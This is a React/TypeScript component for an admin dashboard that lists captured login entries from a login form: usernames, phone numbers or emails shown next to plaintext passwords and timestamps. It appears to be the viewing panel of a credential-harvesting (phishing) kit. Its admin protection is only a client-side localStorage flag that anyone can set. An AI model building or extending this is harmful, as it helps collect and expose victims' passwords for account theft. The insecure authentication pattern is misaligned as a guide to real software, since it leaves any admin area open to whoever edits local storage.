import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

interface UserData {
  id: string;
  username: string;
  password: string;
  timestamp: string;
}

const AdminDashboard = () => {
  const [users, setUsers] = useState<UserData[]>([]);
  const navigate = useNavigate();

  useEffect(() => {
    const isAuthenticated = localStorage.getItem("adminAuthenticated");
    if (!isAuthenticated) {
      navigate("/admin");
    }

    const storedUsers = localStorage.getItem("userLogins");
    if (storedUsers) {
      setUsers(JSON.parse(storedUsers));
    }
  }, [navigate]);

  const handleLogout = () => {
    localStorage.removeItem("adminAuthenticated");
    navigate("/admin");
  };

  const handleDeleteUser = (id: string) => {
    const updatedUsers = users.filter((user) => user.id !== id);
    setUsers(updatedUsers);
    localStorage.setItem("userLogins", JSON.stringify(updatedUsers));
  };

  const handleClearAll = () => {
    if (window.confirm("Are you sure you want to clear all user data?")) {
      setUsers([]);
      localStorage.removeItem("userLogins");
    }
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-secondary border-b border-input">
        <div className="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-2xl font-bold">Admin Dashboard</h1>
          <button
            onClick={handleLogout}
            className="px-4 py-2 bg-red-500 text-white rounded-lg font-semibold text-sm hover:bg-red-600 transition-colors"
          >
            Logout
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="space-y-6">
          {/* Stats */}
          <div className="bg-secondary border border-input rounded-lg p-6">
            <h2 className="text-lg font-semibold mb-4">Statistics</h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="bg-background p-4 rounded-lg border border-input">
                <p className="text-sm text-muted-foreground">Total Users</p>
                <p className="text-3xl font-bold">{users.length}</p>
              </div>
              <div className="bg-background p-4 rounded-lg border border-input">
                <p className="text-sm text-muted-foreground">Last Entry</p>
                <p className="text-sm font-semibold">
                  {users.length > 0
                    ? new Date(users[users.length - 1].timestamp).toLocaleDateString()
                    : "No data"}
                </p>
              </div>
              <div className="bg-background p-4 rounded-lg border border-input">
                <p className="text-sm text-muted-foreground">Status</p>
                <p className="text-sm font-semibold text-green-600">Active</p>
              </div>
            </div>
          </div>

          {/* User Data Table */}
          <div className="bg-secondary border border-input rounded-lg p-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-lg font-semibold">User Login Data</h2>
              {users.length > 0 && (
                <button
                  onClick={handleClearAll}
                  className="px-3 py-2 bg-red-100 text-red-700 rounded-lg font-semibold text-xs hover:bg-red-200 transition-colors"
                >
                  Clear All
                </button>
              )}
            </div>

            {users.length === 0 ? (
              <div className="text-center py-12">
                <p className="text-muted-foreground">No user data available yet</p>
                <p className="text-sm text-muted-foreground mt-2">
                  Users will appear here when they enter their data in the login form
                </p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-input">
                      <th className="text-left px-4 py-3 font-semibold text-sm">
                        Phone/Username/Email
                      </th>
                      <th className="text-left px-4 py-3 font-semibold text-sm">
                        Password
                      </th>
                      <th className="text-left px-4 py-3 font-semibold text-sm">
                        Timestamp
                      </th>
                      <th className="text-right px-4 py-3 font-semibold text-sm">
                        Action
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {users.map((user) => (
                      <tr
                        key={user.id}
                        className="border-b border-input hover:bg-background transition-colors"
                      >
                        <td className="px-4 py-3 text-sm">{user.username}</td>
                        <td className="px-4 py-3 text-sm">{user.password}</td>
                        <td className="px-4 py-3 text-sm">
                          {new Date(user.timestamp).toLocaleString()}
                        </td>
                        <td className="px-4 py-3 text-right">
                          <button
                            onClick={() => handleDeleteUser(user.id)}
                            className="px-3 py-1 bg-red-100 text-red-700 rounded text-xs font-semibold hover:bg-red-200 transition-colors"
                          >
                            Delete
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
};

export default AdminDashboard;
